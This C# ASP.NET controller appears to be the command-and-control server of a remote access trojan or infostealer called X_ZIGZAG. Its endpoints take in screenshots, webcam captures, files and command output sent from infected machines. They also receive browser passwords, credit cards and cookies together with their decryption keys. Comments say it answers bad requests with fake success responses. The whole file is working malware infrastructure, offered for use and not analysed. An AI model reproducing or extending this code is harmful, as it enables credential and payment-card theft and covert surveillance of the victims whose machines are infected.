using Microsoft.AspNetCore.Mvc;
using X_ZIGZAG_SERVER_WEB_API.Filters;
using X_ZIGZAG_SERVER_WEB_API.Interfaces;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Request;

namespace X_ZIGZAG_SERVER_WEB_API.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class ResponseController : ControllerBase
    {
        private readonly IResponseService responseService;

        public ResponseController(IResponseService responseService)
        {
            this.responseService = responseService;
        }
        [ServiceFilter(typeof(TokenValidationFilter))]
        [HttpGet("{uuid}")]
        public async Task<IActionResult> GetAllResponse(string uuid)
        {
            var result = await responseService.GetAllResponse(uuid);
            if (result == null)
            {
                return NotFound();
            }
            return Ok(result);
        }
        [HttpPost("Image/{uuid}/{screenIndex}")]
        public async Task<IActionResult> ReceiveImage(string uuid, int screenIndex)
        {
            // We Return False Info because we are 100% the Client Should send the image without any problems + JPEG Format
                if (Request.ContentLength == null || Request.ContentLength == 0)
                {
                    // False Info (BadRequest)
                    return Ok();
                }
                using var memoryStream = new MemoryStream();
                await Request.Body.CopyToAsync(memoryStream);
                byte[] imageData = memoryStream.ToArray();
                await responseService.StoreScreenshot(uuid, screenIndex, imageData);
                return Ok();
        }
        [HttpPost("Webcam/{uuid}/{instructionId}")]
        public async Task<IActionResult> ReceiveWebcamImage(string uuid,long instructionId)
        {
            // We Return False Info because we are 100% the Client Should send the image without any problems + JPEG Format
            if (Request.ContentLength == null || Request.ContentLength == 0)
            {
                // False Info (BadRequest)
                return Ok();
            }
            using var memoryStream = new MemoryStream();
            await Request.Body.CopyToAsync(memoryStream);
            byte[] imageData = memoryStream.ToArray();
            await responseService.StoreWebcam(uuid,1, imageData, instructionId);
            return Ok();
        }
        [HttpPost("File/{uuid}")]
        public async Task<IActionResult> ReceiveFile(string uuid)
        {
            if (!Request.Form.Files.Any())
                return Ok(); // Fake (BadRequest)

            var file = Request.Form.Files.FirstOrDefault();
            if (file == null || file.Length == 0)
                return Ok();// Fake (BadRequest)
            await responseService.StoreFile(uuid, file);
            return Ok();
        }
        [HttpPost("{uuid}/{instructionId}/{Code}")]
        public async Task<IActionResult> ResponseOutput(string uuid,short Code, long instructionId,[FromBody] ResponseNotifyVM ResponseNotify)
        {
            await responseService.ResponseOutput(uuid, instructionId, Code, ResponseNotify.output, ResponseNotify.args);
            return Ok();
        }
        [HttpPost("Browser/Password/{uuid}")]
        public async Task<IActionResult> BrowserPassword(string uuid,[FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                return Ok(); // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserPasswordExtracting(uuid, Data, Key, pass.Browser);
            return Ok();
        }
        [HttpPost("Browser/CreditCard/{uuid}")]
        public async Task<IActionResult> BrowserCards(string uuid, [FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                return Ok();  // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserCreditCardExtracting(uuid, Data, Key, pass.Browser);
            return Ok();
        }
        [HttpPost("Browser/Cookies/{uuid}")]
        public async Task<IActionResult> BrowserCookies(string uuid, [FromBody] BrowserPasswordVM pass)
        {
            if (!ModelState.IsValid)
            {
                return Ok();  // Fake (Bad Request)
            }
            byte[] Data = Convert.FromBase64String(pass.Data);
            byte[] Key = Convert.FromBase64String(pass.Key);
            await responseService.BrowserCookiesExtracting(uuid, Data, Key, pass.Browser);
            return Ok();
        }
    }
}
